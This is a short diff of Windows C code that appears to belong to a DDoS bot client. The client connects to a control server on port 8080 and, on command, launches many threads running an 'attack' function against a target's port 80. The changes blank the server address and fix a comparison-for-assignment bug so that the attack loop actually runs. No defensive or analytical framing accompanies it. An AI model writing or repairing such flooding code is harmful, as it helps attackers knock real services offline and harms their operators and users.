@@ -21,7 +21,7 @@ int main() {
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
-    const char* server_ip = "127.0.0.1";
+    const char* server_ip = "";
 
     startWinsock(&wsaData);
     server_socket = startSocket();
@@ -37,7 +37,7 @@ int main() {
             target_addr.ip = "";
             target_addr.port = 80;
             printf("Executing attack...\n");
-            running == 1;
+            running = 1;
             for (int i=0; i<NUM_THREADS; i++){
                 attack_threads[i] = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
                 // printf("Thread created");
